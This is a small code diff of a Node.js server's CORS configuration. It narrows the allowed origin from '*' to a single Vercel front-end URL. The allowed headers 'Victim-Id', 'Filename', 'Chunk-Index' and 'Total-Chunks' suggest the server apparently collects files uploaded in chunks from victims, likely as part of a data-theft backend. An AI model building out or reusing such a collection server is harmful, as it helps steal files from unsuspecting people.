@@ -16,7 +16,7 @@ const sslOptions = {
 
 // Enable CORS with specific options
 const corsOptions = {
-  origin: '*', // Allow all origins (for testing)
+  origin:  ['https://front-ehzwe8vjh-2naseernoors-projects.vercel.app/'],// Allow all origins (for testing)
   methods: ['GET', 'POST', 'OPTIONS'],
   allowedHeaders: ['Content-Type', 'Victim-Id', 'Filename', 'Chunk-Index', 'Total-Chunks'],
 };
